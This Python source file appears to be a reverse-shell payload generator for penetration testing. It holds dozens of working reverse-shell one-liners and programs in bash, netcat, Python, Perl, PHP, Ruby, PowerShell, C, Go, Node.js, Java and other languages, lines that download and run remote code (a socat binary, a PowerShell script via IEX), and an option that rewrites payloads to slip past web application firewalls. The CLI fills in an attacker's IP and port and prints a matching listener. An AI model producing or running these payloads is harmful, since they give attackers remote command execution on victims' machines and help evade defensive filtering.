GET_IP_ADDRESS = ["curl ifconfig.me 2>/dev/null"]
LISTENER = ["nc -lnvp PORT"]

BASH_TCP_REVERSE_SHELL = ['bash -i >& /dev/tcp/IP_ADDRESS/PORT 0>&1', '0<&196;exec 196<>/dev/tcp/IP_ADDRESS/PORT; sh <&196 >&196 2>&196', '/bin/bash -l > /dev/tcp/IP_ADDRESS/PORT 0<&1 2>&1']
BASH_UDP_REVERSE_SHELL = ['sh -i >& /dev/udp/IP_ADDRESS/PORT 0>&1']

SOCAT_LISTENER = ['socat file:`tty`,raw,echo=0 tcp-listen:PORT']
SOCAT_REVERSE_SHELL = ["wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:IP_ADDRESS:PORT"]

PERL_REVERSE_SHELL = ["""perl -e 'use Socket;$i="IP_ADDRESS";$p=PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'""", """perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"IP_ADDRESS:PORT");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'"""]
PERL_WINDOWS_ONLY_REVERSE_SHELL = ["""perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"IP_ADDRESS:PORT");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'"""]

PYTHON_IPV4_REVERSE_SHELL = ["""export RHOST="IP_ADDRESS";export RPORT=PORT;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'""", """python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("IP_ADDRESS",PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'""", """python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("IP_ADDRESS",PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'""", """python -c 'import socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("IP_ADDRESS",PORT));subprocess.call(["/bin/sh","-i"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'"""]
PYTHON_IPV4_NO_SPACE_REVERSE_SHELL = ["""python -c 'socket=__import__("socket");os=__import__("os");pty=__import__("pty");s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("IP_ADDRESS",PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'""", """python -c 'socket=__import__("socket");subprocess=__import__("subprocess");os=__import__("os");s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("IP_ADDRESS",PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'""", """python -c 'socket=__import__("socket");subprocess=__import__("subprocess");s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("IP_ADDRESS",PORT));subprocess.call(["/bin/sh","-i"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'""", """python -c 'a=__import__;s=a("socket");o=a("os").dup2;p=a("pty").spawn;c=s.socket(s.AF_INET,s.SOCK_STREAM);c.connect(("IP_ADDRESS",PORT));f=c.fileno;o(f(),0);o(f(),1);o(f(),2);p("/bin/sh")'""", """python -c 'a=__import__;b=a("socket");p=a("subprocess").call;o=a("os").dup2;s=b.socket(b.AF_INET,b.SOCK_STREAM);s.connect(("IP_ADDRESS",PORT));f=s.fileno;o(f(),0);o(f(),1);o(f(),2);p(["/bin/sh","-i"])'""", """python -c 'a=__import__;b=a("socket");c=a("subprocess").call;s=b.socket(b.AF_INET,b.SOCK_STREAM);s.connect(("IP_ADDRESS",PORT));f=s.fileno;c(["/bin/sh","-i"],stdin=f(),stdout=f(),stderr=f())'""", """python -c 'a=__import__;s=a("socket").socket;o=a("os").dup2;p=a("pty").spawn;c=s();c.connect(("IP_ADDRESS",PORT));f=c.fileno;o(f(),0);o(f(),1);o(f(),2);p("/bin/sh")'""", """python -c 'a=__import__;b=a("socket").socket;p=a("subprocess").call;o=a("os").dup2;s=b();s.connect(("IP_ADDRESS",PORT));f=s.fileno;o(f(),0);o(f(),1);o(f(),2);p(["/bin/sh","-i"])'""", """python -c 'a=__import__;b=a("socket").socket;c=a("subprocess").call;s=b();s.connect(("IP_ADDRESS",PORT));f=s.fileno;c(["/bin/sh","-i"],stdin=f(),stdout=f(),stderr=f())'"""]
PYTHON_IPV6_REVERSE_SHELL = ["""python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect(("IP_ADDRESS",PORT,0,2));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'"""]
PYTHON_IPV6_NO_SPACE_REVERSE_SHELL = ["""python -c 'socket=__import__("socket");os=__import__("os");pty=__import__("pty");s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect(("IP_ADDRESS",PORT,0,2));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'""", """python -c 'a=__import__;c=a("socket");o=a("os").dup2;p=a("pty").spawn;s=c.socket(c.AF_INET6,c.SOCK_STREAM);s.connect(("IP_ADDRESS",PORT,0,2));f=s.fileno;o(f(),0);o(f(),1);o(f(),2);p("/bin/sh")'"""]
PYTHON_CODE_REVERSE_SHELL = ["""import socket,os,pty\ns=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\ns.connect(("IP_ADDRESS",PORT))\nos.dup2(s.fileno(),0)\nos.dup2(s.fileno(),1)\nos.dup2(s.fileno(),2)\npty.spawn("/bin/sh")"""]

PHP_REVERSE_SHELL = ["""php -r '$sock=fsockopen("IP_ADDRESS",PORT);exec("/bin/sh -i <&3 >&3 2>&3");'""", """php -r '$sock=fsockopen("IP_ADDRESS",PORT);shell_exec("/bin/sh -i <&3 >&3 2>&3");'""", """php -r '$sock=fsockopen("IP_ADDRESS",PORT);`/bin/sh -i <&3 >&3 2>&3`;'""", """php -r '$sock=fsockopen("IP_ADDRESS",PORT);system("/bin/sh -i <&3 >&3 2>&3");'""", """php -r '$sock=fsockopen("IP_ADDRESS",PORT);passthru("/bin/sh -i <&3 >&3 2>&3");'""", """php -r '$sock=fsockopen("IP_ADDRESS",PORT);popen("/bin/sh -i <&3 >&3 2>&3", "r");'""", """php -r '$sock=fsockopen("IP_ADDRESS",PORT);$proc=proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'"""]

RUBY_REVERSE_SHELL = ["""ruby -rsocket -e'f=TCPSocket.open("IP_ADDRESS",PORT).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'""", """ruby -rsocket -e'exit if fork;c=TCPSocket.new("IP_ADDRESS","PORT");loop{c.gets.chomp!;(exit! if $_=="exit");($_=~/cd (.+)/i?(Dir.chdir($1)):(IO.popen($_,?r){|io|c.print io.read}))rescue c.puts "failed: #{$_}"}'"""]
RUBY_WINDOWS_ONLY_REVERSE_SHELL = ["""ruby -rsocket -e 'c=TCPSocket.new("IP_ADDRESS","PORT");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'"""]

GOLANG_REVERSE_SHELL = ["""echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","IP_ADDRESS:PORT");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go"""]

NETCAT_REVERSE_SHELL = ["""nc -e /bin/sh IP_ADDRESS PORT""", 'nc -e /bin/bash IP_ADDRESS PORT', 'nc -c bash IP_ADDRESS PORT']
NETCAT_OPENBSD_REVERSE_SHELL = ["""rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc IP_ADDRESS PORT >/tmp/f"""]
NETCAT_BUSYBOX_REVERSE_SHELL = ["""rm /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2>&1|nc IP_ADDRESS PORT >/tmp/f"""]

NCAT_REVERSE_SHELL = ["""ncat IP_ADDRESS PORT -e /bin/bash""", 'ncat --udp IP_ADDRESS PORT -e /bin/bash']

OPENSSL_ATTACKER = ["""openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes""", """openssl s_server -quiet -key key.pem -cert cert.pem -port PORT"""]
OPENSSL_VICTIM = ["""mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect IP_ADDRESS:PORT > /tmp/s; rm /tmp/s"""]

POWERSHELL_REVERSE_SHELL = ["""powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("IP_ADDRESS",PORT);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()""", '''powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('IP_ADDRESS',PORT);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"''', """powershell IEX (New-Object Net.WebClient).DownloadString('https://gist.githubusercontent.com/staaldraad/204928a6004e89553a8d3db0ce527fd5/raw/fe5f74ecfae7ec0f2d50895ecf9ab9dafe253ad4/mini-reverse.ps1')"""]

AWK_REVERSE_SHELL = ["""awk 'BEGIN {s = "/inet/tcp/0/IP_ADDRESS/PORT"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null"""]

JAVA_REVERSE_SHELL = ["""Runtime r = Runtime.getRuntime();\nProcess p = r.exec("/bin/bash -c 'exec 5<>/dev/tcp/IP_ADDRESS/PORT;cat <&5 | while read line; do $line 2>&5 >&5; done'");\np.waitFor();""", """String host="IP_ADDRESS";\nint port=4444;\nString cmd="cmd.exe";\nProcess p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();"""]

TELNET_ATTACKER = ["""nc -lvp 8080\nnc -lvp 8081"""]
TELNET_VICTIM = ["""telnet IP_ADDRESS 8080 | /bin/sh | telnet IP_ADDRESS 8081"""]

LUA_LINUX_REVERSE_SHELL = ['''lua -e "require('socket');require('os');t=socket.tcp();t:connect('IP_ADDRESS','PORT');os.execute('/bin/sh -i <&3 >&3 2>&3');"''']
LUA_WINDOWS_REVERSE_SHELL = ["""lua5.1 -e 'local host, port = "IP_ADDRESS", PORT local socket = require("socket") local tcp = socket.tcp() local io = require("io") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, "r") local s = f:read("*a") f:close() tcp:send(s) if status == "closed" then break end end tcp:close()'"""]

NODE_JS_REVERSE_SHELL = ["""(function(){
    var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn("/bin/sh", []);
    var client = new net.Socket();
    client.connect(PORT, "IP_ADDRESS", function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    return /a/; // Prevents the Node.js application form crashing
})();""", """require('child_process').exec('nc -e /bin/sh IP_ADDRESS PORT')""", """-var x = global.process.mainModule.require
-x('child_process').exec('nc IP_ADDRESS PORT -e /bin/bash')"""]

GROOVY_REVERSE_SHELL = ["""String host="IP_ADDRESS";
int port=PORT;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();""", """Thread.start {
    String host="IP_ADDRESS";
    int port=PORT;
    String cmd="cmd.exe";
    Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
}"""]

C_REVERSE_SHELL = ["""#include <stdio.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>
#include <netinet/in.h>
#include <arpa/inet.h>

int main(void){
    int port = PORT;
    struct sockaddr_in revsockaddr;

    int sockt = socket(AF_INET, SOCK_STREAM, 0);
    revsockaddr.sin_family = AF_INET;       
    revsockaddr.sin_port = htons(port);
    revsockaddr.sin_addr.s_addr = inet_addr("IP_ADDRESS");

    connect(sockt, (struct sockaddr *) &revsockaddr, 
    sizeof(revsockaddr));
    dup2(sockt, 0);
    dup2(sockt, 1);
    dup2(sockt, 2);

    char * const argv[] = {"/bin/sh", NULL};
    execve("/bin/sh", argv, NULL);

    return 0;       
}"""]
C_COMPILE = ['gcc /tmp/shell.c --output csh && csh']

DART_REVERSE_SHELL = ["""import 'dart:io';
import 'dart:convert';

main() {
  Socket.connect("IP_ADDRESS", PORT).then((socket) {
    socket.listen((data) {
      Process.start('powershell.exe', []).then((Process process) {
        process.stdin.writeln(new String.fromCharCodes(data).trim());
        process.stdout
          .transform(utf8.decoder)
          .listen((output) { socket.write(output); });
      });
    },
    onDone: () {
      socket.destroy();
    });
  });
}"""]

import subprocess
import argparse
import ipaddress

class Color:
   PURPLE = '\033[95m'
   CYAN = '\033[96m'
   DARKCYAN = '\033[36m'
   BLUE = '\033[94m'
   GREEN = '\033[92m'
   YELLOW = '\033[93m'
   RED = '\033[91m'
   BOLD = '\033[1m'
   UNDERLINE = '\033[4m'
   END = '\033[0m'

def getCommandResult(command):
    p = subprocess.Popen(command, shell=True, stdin=subprocess.PIPE, stderr=subprocess.STDOUT, stdout=subprocess.PIPE, close_fds=True)
    out, _ = p.communicate()

    return str(out.decode('utf-8'))

def getParameter():
    parser = argparse.ArgumentParser()
    parser.add_argument('-ip', type=str, help='External ip address.', default=getCommandResult(GET_IP_ADDRESS[0]))
    parser.add_argument('-p', '--port', type=str, help='Port you want to reverse.', default='4444')
    parser.add_argument('-t', '--type', type=str, default='bash_tcp', help="""Type: awk, bash_tcp, bash_udp, c, dart, golang, groovy, java, lua_linux, lua_windows, ncat, nc, nc_openbsd, nc_busybox, nodejs, openssl, perl, perl_windows, php, powershell, python, python_no_space, python_ipv6, python_ipv6_no_space, python_code, ruby, ruby_windows, socat, telnet. Default: bash_tcp""")
    parser.add_argument('-b', '--bypass', type=int, default='0', help='For bypassing waf.', nargs='?', const=1)
    parser.add_argument('-c1', '--character1', type=str, default=' ', help='Character to replace.', nargs=None)
    parser.add_argument('-c2', '--character2', type=str, default='{IFS}', help='Replace to new character.', nargs=None)
    args = parser.parse_args()
    return vars(args)

def banner():
    f = open('banner.txt', 'r')
    return f.read()

def bypass(bypass_type, payload, bypass_char, bypass_char2):
    if bypass_type:
        payload = payload.replace(bypass_char, bypass_char2)
    else:
        pass
    
    return payload

def getReverseShellPayload(reverse_shell_type, ip, port, bypass_type=None, bypass_char=None, bypass_char2=None):
    reverse_shell = []

    if reverse_shell_type == 'awk':
        reverse_shell = AWK_REVERSE_SHELL
    elif reverse_shell_type == 'bash_tcp':
        reverse_shell = BASH_TCP_REVERSE_SHELL
    elif reverse_shell_type == 'bash_udp':
        reverse_shell = BASH_UDP_REVERSE_SHELL
    elif reverse_shell_type == 'c':
        reverse_shell = C_REVERSE_SHELL
        print('Compile with', C_COMPILE[0])
    elif reverse_shell_type == 'dart':
        reverse_shell = DART_REVERSE_SHELL
    elif reverse_shell_type == 'golang':
        reverse_shell = GOLANG_REVERSE_SHELL
    elif reverse_shell_type == 'groovy':
        reverse_shell = GROOVY_REVERSE_SHELL
    elif reverse_shell_type == 'java':
        reverse_shell = JAVA_REVERSE_SHELL
    elif reverse_shell_type == 'lua_linux':
        reverse_shell = LUA_LINUX_REVERSE_SHELL
    elif reverse_shell_type == 'lua_windows':
        reverse_shell = LUA_WINDOWS_REVERSE_SHELL
    elif reverse_shell_type == 'ncat':
        reverse_shell = NCAT_REVERSE_SHELL
    elif reverse_shell_type == 'nc':
        reverse_shell = NETCAT_REVERSE_SHELL
    elif reverse_shell_type == 'nc_openbsd':
        reverse_shell = NETCAT_OPENBSD_REVERSE_SHELL
    elif reverse_shell_type == 'nc_busybox':
        reverse_shell = NETCAT_BUSYBOX_REVERSE_SHELL
    elif reverse_shell_type == 'nodejs':
        reverse_shell = NODE_JS_REVERSE_SHELL
    elif reverse_shell_type == 'openssl':
        reverse_shell = OPENSSL_VICTIM
        print('ATTACKER: ')
        for i in OPENSSL_ATTACKER:
            print(i.replace('IP_ADDRESS', ip).replace('PORT', port))
    elif reverse_shell_type == 'perl':
        reverse_shell = PERL_REVERSE_SHELL
    elif reverse_shell_type == 'perl_windows':
        reverse_shell = PERL_WINDOWS_ONLY_REVERSE_SHELL
    elif reverse_shell_type == 'php':
        reverse_shell = PHP_REVERSE_SHELL
    elif reverse_shell_type == 'powershell':
        reverse_shell = POWERSHELL_REVERSE_SHELL
    elif reverse_shell_type == 'python':
        reverse_shell = PYTHON_IPV4_REVERSE_SHELL
    elif reverse_shell_type == 'python_no_space':
        reverse_shell = PYTHON_IPV4_NO_SPACE_REVERSE_SHELL
    elif reverse_shell_type == 'python_ipv6':
        reverse_shell = PYTHON_IPV6_REVERSE_SHELL
        ip = ipaddress.IPv6Address('2002::' + ip).compressed
    elif reverse_shell_type == 'python_ipv6_no_space':
        reverse_shell = PYTHON_IPV6_NO_SPACE_REVERSE_SHELL
        ip = ipaddress.IPv6Address('2002::' + ip).compressed
    elif reverse_shell_type == 'python_code':
        reverse_shell = PYTHON_CODE_REVERSE_SHELL
    elif reverse_shell_type == 'ruby':
        reverse_shell = RUBY_REVERSE_SHELL
    elif reverse_shell_type == 'ruby_windows':
        reverse_shell = RUBY_WINDOWS_ONLY_REVERSE_SHELL
    elif reverse_shell_type == 'socat':
        reverse_shell = SOCAT_REVERSE_SHELL
        print('LISTENER: ')
        for i in SOCAT_LISTENER:
            print(i)
    elif reverse_shell_type == 'telnet':
        reverse_shell = TELNET_VICTIM
        print('LISTENER: ')
        for i in TELNET_ATTACKER:
            print(i)
    else:
        print(Color.RED + 'Invalid type')
        exit()
    
    print('=======================================================================================================')
    print('Your payload: ')
    for i in reverse_shell:
        print(Color.BOLD + bypass(bypass_type, i, bypass_char, bypass_char2).replace('IP_ADDRESS', ip).replace('PORT', port) + Color.END)
    print('=======================================================================================================')
    print(Color.RED + "Don't forget to check with others shell : sh, ash, bsh, csh, ksh, zsh, pdksh, tcsh, bash")

def main():
    print()
    print(banner())
    args = getParameter()
    print()
    print('Your listener:' + Color.GREEN, LISTENER[0].replace('PORT', args['port']), Color.END)
    getReverseShellPayload(args['type'], args['ip'], args['port'], args['bypass'], args['character1'], args['character2'])

if __name__ == "__main__":
    main()